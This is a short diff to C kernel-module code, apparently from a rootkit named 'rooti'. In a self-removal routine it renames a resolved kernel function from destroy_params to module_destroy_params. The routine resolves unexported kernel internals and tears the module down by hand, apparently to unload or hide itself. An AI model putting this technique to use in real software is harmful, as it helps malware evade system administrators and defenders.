@@ -35,7 +35,7 @@ static int rooti_self_free(void)
     ROOTI_RESOLVE_FUNC_ADDR(mod_sysfs_teardown, -ENOENT, void, struct module *);
     ROOTI_RESOLVE_FUNC_ADDR(module_arch_cleanup, -ENOENT, void, struct module *);
     ROOTI_RESOLVE_FUNC_ADDR(module_unload_free, -ENOENT, void, struct module *);
-    ROOTI_RESOLVE_FUNC_ADDR(destroy_params, -ENOENT, void, const struct kernel_param *, unsigned);
+    ROOTI_RESOLVE_FUNC_ADDR(module_destroy_params, -ENOENT, void, const struct kernel_param *, unsigned);
     ROOTI_RESOLVE_FUNC_ADDR(mod_tree_remove, -ENOENT, void, struct module *);
     ROOTI_RESOLVE_FUNC_ADDR(module_bug_cleanup, -ENOENT, void, struct module *);
     ROOTI_RESOLVE_FUNC_ADDR(module_arch_freeing_init, -ENOENT, void, struct module *);
@@ -52,7 +52,7 @@ static int rooti_self_free(void)
 
     __module_unload_free(THIS_MODULE);
 
-    __destroy_params(THIS_MODULE->kp, THIS_MODULE->num_kp);
+    __module_destroy_params(THIS_MODULE->kp, THIS_MODULE->num_kp);
 
     mutex_lock(__module_mutex);
 
